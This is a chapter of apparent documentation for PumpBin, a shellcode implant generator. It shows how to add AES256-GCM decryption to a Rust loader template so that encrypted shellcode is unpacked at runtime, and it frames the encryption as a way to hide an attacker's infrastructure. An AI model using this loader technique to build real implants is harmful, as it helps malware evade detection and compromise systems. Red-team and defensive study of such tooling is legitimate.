# Encryption

In this chapter, we will create a plugin that uses the AES256-GCM encryption method.

In the previous chapter, when we used PumpBin Maker to create a plugin, the Encrypt Type was set to None.
This option has two possible meanings in the real world:

1. You are using an encryption method that PumpBin does not support yet (please submit an issue)
1. You are using a custom encryption method (PumpBin will have a hook system in the future, and you will be able to run custom code during encryption, generation, or patching for maximum flexibility)

In both cases, you may want to make a Plugin of type `Remote`, and use a fixed encryption password, only using PumpBin to modify the shellcode url.

Besides, most hackers should want to encrypt their shellcode, and no one wants to expose their infrastructure.

## Creating a binary implant template

To create a plugin with encryption, our binary implant template needs to implement the corresponding decryption logic.

We will change it based on the [previous chapter code](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread).

Add the following dependencies to the end of the Cargo.toml file

```toml
aes-gcm = "0.10.3"
```

Add the following decryption function above the main function in main.rs

```rust
fn decrypt(data: &[u8]) -> Vec<u8> {
    const KEY: &[u8; 32] = b"$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$";
    const NONCE: &[u8; 12] = b"$$NNNNNNNN$$";

    let aes = Aes256Gcm::new_from_slice(KEY).unwrap();
    let nonce = Nonce::from_slice(NONCE);
    aes.decrypt(nonce, data).unwrap()
}
```

Two of them are references to arrays wrapped in $$ and have already appeared in the previous chapter. They are two `Place Holder`, which are used by PumpBin to locate placeholder data.
(`Place Holder` is a fixed size, `Prefix` is a dynamic size, so in the previous chapter, Size Holder is needed to determine the real length of the shellcode)

Add the following code after the fourth line of the main function in main.rs

```rust
let shellcode = decrypt(shellcode);
```

The main function after the addition is complete is as follows

```rust
fn main() {
    let shellcode = include_bytes!("../shellcode");
    const SIZE_HOLDER: &str = "$$99999$$";
    let shellcode_len = usize::from_str_radix(SIZE_HOLDER, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

Compiling the modified `create_thread` project, we will get a binary implant template that uses AES256-GCM to decrypt the shellcode.

```sh
cargo b -r
```

## Creating the plugin

We use PumpBin Maker to make the plugin. The rest of the operation is the same, the only difference is that Encrypt Type is set to AesGcm.

Key: `$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$`

Nonce fill in `$$NNNNNNNN$$`

## Test Plugin

Install the plugin created with PumpBin and use `w64-exec-calc-shellcode-func` to generate a final implant. You should see the calc program start.

At this point, we have created a `Local` type plugin that uses the AES256-GCM encryption method

In the previous two chapters, I always highlighted `Local` to remind you that this is a keyword, and it is important to understand them correctly when using PumpBin.

In the next chapter, we will make our first plugin of type "Remote". This allows the shellcode to be hosted on a remote server.
PumpBin will generate an encrypted shellcode file according to the encryption settings (None is also an encryption method). The user will host the encrypted shellcode on a remote server and then tell PumpBin the hosting address.

The complete project file for this example is available in the PumpBin code repository at [examples/create_thread_encrypt](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_encrypt/src/main.rs).
